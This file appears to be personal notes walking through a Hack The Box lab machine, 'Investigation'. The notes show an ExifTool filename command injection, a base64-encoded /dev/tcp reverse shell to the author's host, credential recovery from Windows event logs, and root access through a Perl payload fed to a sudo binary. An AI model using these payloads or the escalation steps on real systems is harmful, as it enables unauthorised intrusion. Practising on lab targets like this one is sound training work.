@@ -1,0 +1,595 @@
+10.129.139.47
+
+
+http://eforenzics.htb/
+
+
+
+eForenzics
+Digital Forensic Services
+
+eForenzics provides high quality digital investigations. Everything from reverse engineering to procedural analysis
+
+
+
+Image Forensics
+
+Upload an image file and we will provide a detailed forensic analysis.
+At this time we can only process jpg images.
+
+
+
+
+imagejpg has been uploaded. The analysis report can be viewed here
+
+Please save this report as it will only be available for the next five minutes
+
+
+http://eforenzics.htb/analysed_images/imagejpg.txt
+
+ExifTool Version Number         : 12.37
+File Name                       : image.jpg
+Directory                       : .
+File Size                       : 2.0 MiB
+File Modification Date/Time     : 2023:01:23 10:40:51+00:00
+File Access Date/Time           : 2023:01:23 10:40:51+00:00
+File Inode Change Date/Time     : 2023:01:23 10:40:51+00:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : inches
+X Resolution                    : 72
+Y Resolution                    : 72
+Profile CMM Type                : Little CMS
+Profile Version                 : 2.1.0
+Profile Class                   : Display Device Profile
+Color Space Data                : RGB
+Profile Connection Space        : XYZ
+Profile Date Time               : 2012:01:25 03:41:57
+Profile File Signature          : acsp
+Primary Platform                : Apple Computer Inc.
+CMM Flags                       : Not Embedded, Independent
+Device Manufacturer             : 
+Device Model                    : 
+Device Attributes               : Reflective, Glossy, Positive, Color
+Rendering Intent                : Perceptual
+Connection Space Illuminant     : 0.9642 1 0.82491
+Profile Creator                 : Little CMS
+Profile ID                      : 0
+Profile Description             : c2
+Profile Copyright               : IX
+Media White Point               : 0.9642 1 0.82491
+Media Black Point               : 0.01205 0.0125 0.01031
+Red Matrix Column               : 0.43607 0.22249 0.01392
+Green Matrix Column             : 0.38515 0.71687 0.09708
+Blue Matrix Column              : 0.14307 0.06061 0.7141
+Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
+Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
+Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
+Image Width                     : 6000
+Image Height                    : 4000
+Encoding Process                : Progressive DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 6000x4000
+Megapixels                      : 24.0
+
+It uses exiftool 12.37
+
+https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429
+
+Exiftool versions < 12.38 are vulnerable to Command Injection through a crafted filename. If the filename passed to exiftool ends with a pipe character | and exists on the filesystem, then the file will be treated as a pipe and executed as an OS command.
+
+first of all I have to understand how to save the file with the name I need.
+
+to do the exploit I need to have it with a | at the end
+
+if I upload image.jpg| the | character is stripped:
+
+
+
+imagejpg has been uploaded. The analysis report can be viewed here
+
+Please save this report as it will only be available for the next five minutes
+
+
+Content-Disposition: form-data; name="image"; filename="image.jpg"
+
+Content-Disposition: form-data; name="image|"; filename="image.jpg" -----> error: only jpeg and png 
+Content-Disposition: form-data; name="image"; filename="image.jpg|" -----> is saved as imagejpg 
+
+
+
+uploading filename 'image.jpg |'
+
+I get:
+
+ExifTool Version Number         : 12.37
+File Name                       : image.jpg |
+Directory                       : .
+Error                           : Error opening file
+
+So it could work, I try to perform a web request to see if code gets executed 
+
+
+
+
+It looks like it works!
+
+sudo tcpdump -i tun0             
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+06:32:00.621091 IP eforenzics.htb > 10.10.14.36: ICMP echo request, id 2, seq 243, length 64
+06:32:00.621107 IP 10.10.14.36 > eforenzics.htb: ICMP echo reply, id 2, seq 243, length 64
+06:32:00.707808 IP eforenzics.htb > 10.10.14.36: ICMP echo request, id 1, seq 288, length 64
+06:32:00.707825 IP 10.10.14.36 > eforenzics.htb: ICMP echo reply, id 1, seq 288, length 64
+06:32:00.790412 IP eforenzics.htb > 10.10.14.36: ICMP echo request, id 3, seq 48, length 64
+06:32:00.790423 IP 10.10.14.36 > eforenzics.htb: ICMP echo reply, id 3, seq 48, length 64
+
+
+Content-Disposition: form-data; name="image"; filename="ping 10.10.14.36 |"
+
+now I create a filename with a reverse shell
+
+I can't put "/" characters in filenames on linux 
+
+nc reverse shell (does not include /) is not working, try with php:
+
+php -r '$sock=fsockopen("10.10.14.36",9001);exec("sh <&3 >&3 2>&3");' |
+
+not working
+
+I can try to use base64 to encode my payload and execute it using more | (linux subshells)
+
+echo COMMAND_BASE64 | base64 -d | bash 
+
+echo "sh -i >& /dev/tcp/10.10.14.36/9001 0>&1 " | base64
+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzYvOTAwMSAwPiYxIAo=
+
+so the filename will be:
+
+echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzYvOTAwMSAwPiYxIAo= | base64 -d | bash | 
+
+yes it worked!
+
+nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.36] from (UNKNOWN) [10.129.139.47] 49178
+sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+cat /etc/hosts
+127.0.0.1 localhost investigation.htb
+127.0.1.1 investigation 
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+no other virtual hosts
+
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+smorton:x:1000:1000:eForenzics:/home/smorton:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+backup:x:34:34::/var/backups:/usr/sbin/nologin
+fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+_laurel:x:997:997::/var/log/laurel:/bin/false
+
+
+the user is smorton
+
+no sudo
+no suid
+no notable files in /var/www
+
+
+found something:
+
+
+
+$ pwd
+/usr/local/investigation
+$ ls -lart
+total 1288
+drwxr-xr-x 11 root     root        4096 Aug 27 21:54 ..
+drwxr-xr-x  2 root     root        4096 Sep 30 23:43 .
+-rw-rw-r--  1 smorton  smorton  1308160 Oct  1 00:35 Windows Event Logs for Analysis.msg
+-rw-rw-r--  1 www-data www-data       0 Oct  1 00:40 analysed_log
+
+
+donwloaded the Windows Event Log, I could try to parse it with this tool:
+
+https://www.kali.org/tools/grokevt/
+
+
+probably it is a Outlook file formato (.msg) I have to try to convert it to another format I can open 
+
+sudo apt-get install libemail-outlook-message-perl libemail-sender-perl
+
+└─$ msgconvert Windows\ Event\ Logs\ for\ Analysis.msg 
+
+I got the file:
+
+'Windows Event Logs for Analysis.eml'
+
+now I can read the file (or I could import in thunderbird or other mail apps)
+
+tha email is:
+
+
+Subject: Windows Event Logs for Analysis
+From: Thomas Jones <thomas.jones@eforenzics.htb>
+To: Steve Morton <steve.morton@eforenzics.htb>
+
+Hi Steve,
+
+Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I'm concerned that they are moving data on to production without following our data transfer procedures. 
+
+Regards.
+Tom
+
+
+
+
+And it looks like there is an attachment I can unpack it with munpack
+
+└─$ munpack Windows\ Event\ Logs\ for\ Analysis.eml 
+)art1 (application/rtf
+evtx-logs.zip (application/octet-stream)
+
+
+yes a zip file has been extracted 
+
+it contains security.evtx 
+
+I can use libevtx
+
+sudo apt install libevtx-utils
+
+└─$ evtxexport security.evtx > security.txt
+
+I have to look for something related to Logon/authentication. Some of the events for logono/auth of Windows:
+
+4625
+https://www.manageengine.com/products/active-directory-audit/kb/windows-security-log-event-id-4625.html
+4624
+https://www.manageengine.com/products/active-directory-audit/kb/windows-security-log-event-id-4624.html
+4776
+https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4776
+
+
+I try to look into the file for these events:
+
+found a password!
+
+Event number			: 10145
+Creation time			: Aug 01, 2022 19:15:15.374671300 UTC
+Written time			: Aug 01, 2022 19:15:15.374671300 UTC
+Event level			: Information (0)
+Computer name			: eForenzics-DI
+Source name			: Microsoft-Windows-Security-Auditing
+Event identifier		: 0x000012a8 (4776)
+Number of strings		: 4
+String: 1			: MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
+String: 2			: Def@ultf0r3nz!csPa$$
+String: 3			: EFORENZICS-DI
+String: 4			: 0xc0000064
+
+Event number			: 10146
+Creation time			: Aug 01, 2022 19:15:15.374769400 UTC
+Written time			: Aug 01, 2022 19:15:15.374769400 UTC
+Event level			: Information (0)
+Computer name			: eForenzics-DI
+Source name			: Microsoft-Windows-Security-Auditing
+Event identifier		: 0x00001211 
+
+Number of strings		: 21
+String: 1			: S-1-5-18
+String: 2			: EFORENZICS-DI$
+String: 3			: WORKGROUP
+String: 4			: 0x00000000000003e7
+String: 5			: S-1-0-0
+String: 6			: Def@ultf0r3nz!csPa$$
+String: 7			: 
+String: 8			: 0xc000006d
+String: 9			: %%2313
+String: 10			: 0xc0000064
+String: 11			: 7
+String: 12			: User32 
+String: 13			: Negotiate
+String: 14			: EFORENZICS-DI
+String: 15			: -
+String: 16			: -
+String: 17			: 0
+String: 18			: 0x0000000000000180
+String: 19			: C:\Windows\System32\svchost.exe
+String: 20			: 127.0.0.1
+String: 21			: 0
+
+
+
+Def@ultf0r3nz!csPa$$ 
+
+could be password for user smorton?
+
+yes! got user:
+
+ssh smorton@eforenzics.htb
+smorton@eforenzics.htb's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-137-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 23 Jan 2023 03:32:14 PM UTC
+
+  System load:  0.07              Processes:             242
+  Usage of /:   61.2% of 3.97GB   Users logged in:       0
+  Memory usage: 15%               IPv4 address for eth0: 10.129.139.47
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Jan 23 15:32:07 2023 from 10.10.14.36
+smorton@investigation:~$ id 
+uid=1000(smorton) gid=1000(smorton) groups=1000(smorton)
+smorton@investigation:~$ pwd
+/home/smorton
+smorton@investigation:~$ cat user.txt 
+55c1b6f00c1d30c916b04ccc72168fad
+smorton@investigation:~$ 
+
+
+smorton@investigation:~$ sudo -l
+Matching Defaults entries for smorton on investigation:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User smorton may run the following commands on investigation:
+    (root) NOPASSWD: /usr/bin/binary
+
+smorton@investigation:~$ ls -lart /usr/bin/binary
+-r-xr-xr-- 1 root root 19024 Jan  5 16:02 /usr/bin/binary
+
+
+smorton@investigation:~$ /usr/bin/binary
+-bash: /usr/bin/binary: Permission denied
+smorton@investigation:~$ sudo /usr/bin/binary
+Exiting... 
+smorton@investigation:~$ sudo /usr/bin/binary -h
+Exiting... 
+smorton@investigation:~$ sudo /usr/bin/binary --help
+Exiting... 
+
+
+from strings:
+
+
+smorton@investigation:~$ strings /usr/bin/binary
+/lib64/ld-linux-x86-64.so.2
+libcurl-gnutls.so.4
+__gmon_start__
+_ITM_deregisterTMCloneTable
+_ITM_registerTMCloneTable
+curl_easy_cleanup
+curl_easy_init
+curl_easy_setopt
+curl_easy_perform
+libc.so.6
+setuid
+exit
+fopen
+puts
+fclose
+malloc
+system
+getuid
+__cxa_finalize
+strcmp
+__libc_start_main
+snprintf
+GLIBC_2.2.5
+CURL_GNUTLS_3
+u+UH
+[]A\A]A^A_
+Exiting... 
+lDnxUysaQn
+Running... 
+perl ./%s
+rm -f ./lDnxUysaQn
+:*3$"
+GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
+crtstuff.c
+
+
+perl ./%s
+rm -f ./lDnxUysaQn
+crtstuff.c
+
+
+saved binary on attacker machine 
+
+
+opend it with ghidra
+
+
+
+  if (param_1 != 3) {
+    puts("Exiting... ");
+                    /* WARNING: Subroutine does not return */
+    exit(0);
+  }
+
+  iVar2 = strcmp(*(char **)(param_2 + 0x10),"lDnxUysaQn");
+  if (iVar2 != 0) {
+    puts("Exiting... ");
+                    /* WARNING: Subroutine does not return */
+    exit(0);
+  }
+
+  so it takes exactly 2 parameters and the second one must be "lDnxUysaQn" 
+
+
+smorton@investigation:~$ sudo /usr/bin/binary 1 lDnxUysaQn
+Running... 
+
+while it is running the file lDnxUysaQn is created in the current directory
+
+  }
+  iVar2 = strcmp(*(char **)(param_2 + 0x10),"lDnxUysaQn");
+  if (iVar2 != 0) {
+    puts("Exiting... ");
+                    /* WARNING: Subroutine does not return */
+    exit(0);
+  }
+  puts("Running... ");
+  __stream = fopen(*(char **)(param_2 + 0x10),"wb");
+  uVar3 = curl_easy_init();
+  curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8));
+  curl_easy_setopt(uVar3,0x2711,__stream);
+  curl_easy_setopt(uVar3,0x2d,1);
+  iVar2 = curl_easy_perform(uVar3);
+  if (iVar2 == 0) {
+    iVar2 = snprintf((char *)0x0,0,"%s",*(undefined8 *)(param_2 + 0x10));
+    __s = (char *)malloc((long)iVar2 + 1);
+    snprintf(__s,(long)iVar2 + 1,"%s",*(undefined8 *)(param_2 + 0x10));
+    iVar2 = snprintf((char *)0x0,0,"perl ./%s",__s);
+    __s_00 = (char *)malloc((long)iVar2 + 1);
+    snprintf(__s_00,(long)iVar2 + 1,"perl ./%s",__s);
+    fclose(__stream);
+    curl_easy_cleanup(uVar3);
+    setuid(0);
+    system(__s_00);
+    system("rm -f ./lDnxUysaQn");
+    return 0;
+  }
+  puts("Exiting... ");
+                    /* WARNING: Subroutine does not return */
+  exit(0);
+}
+
+it uses curl_easy 
+
+the steps are:
+
+__stream = fopen(*(char **)(param_2 + 0x10),"wb");
+
+open the lDnxUysaQn file in wb mode 
+
+curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8));
+
+set an option in libcurl, probably this could be the address, 
+
+curl_easy_setopt(uVar3,0x2711,__stream);
+
+sets the file opened before as another param for libcurl, this is probably the output file
+
+curl_easy_setopt(uVar3,0x2d,1);
+
+set something else (don't know what)
+
+iVar2 = curl_easy_perform(uVar3);
+
+performs the http request
+
+if (iVar2 == 0)
+
+checks if curl was ok (from documentation) : CURLE_OK (0) means everything was OK, non-zero means an error occurred as <curl/curl.h> defines - see libcurl-errors. If the CURLOPT_ERRORBUFFER was set with curl_easy_setopt there will be a readable error message in the error buffer when non-zero is returned. 
+
+    iVar2 = snprintf((char *)0x0,0,"%s",*(undefined8 *)(param_2 + 0x10));
+    __s = (char *)malloc((long)iVar2 + 1);
+    snprintf(__s,(long)iVar2 + 1,"%s",*(undefined8 *)(param_2 + 0x10));
+    iVar2 = snprintf((char *)0x0,0,"perl ./%s",__s);
+    __s_00 = (char *)malloc((long)iVar2 + 1);
+    snprintf(__s_00,(long)iVar2 + 1,"perl ./%s",__s);
+    fclose(__stream);
+    curl_easy_cleanup(uVar3);
+    setuid(0);
+    system(__s_00);
+    system("rm -f ./lDnxUysaQn");
+    return 0;
+
+if curl is ok execute what it gets with perl (before it saves it in the file)
+then delete the file 
+
+If I am able to find a way to manipulate the address it tries to reach I could be able to execute coode with perl
+I have to write this value:
+
+*(undefined8 *)(param_2 + 8)
+
+where param_2 is the array containing all inputs
+
+so if I put the address as first parameter and lDnxUysaQn as second parameter I should be able to execute malicious perl code
+
+I can do this directly on localhost:
+
+smorton@investigation:~$ echo 'exec("/bin/sh")' > file.pl
+smorton@investigation:~$ cat file.pl 
+exec("/bin/sh")
+smorton@investigation:~$ 
+
+
+
+smorton@investigation:~$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+127.0.0.1 - - [23/Jan/2023 16:40:24] "GET /file.pl HTTP/1.1" 200 -
+
+
+
+smorton@investigation:~$ sudo /usr/bin/binary http://127.0.0.1:8080/file.pl  lDnxUysaQn
+Running... 
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+bad69a5367b542c8c1737085548b3f3e
+# 
+
+
+
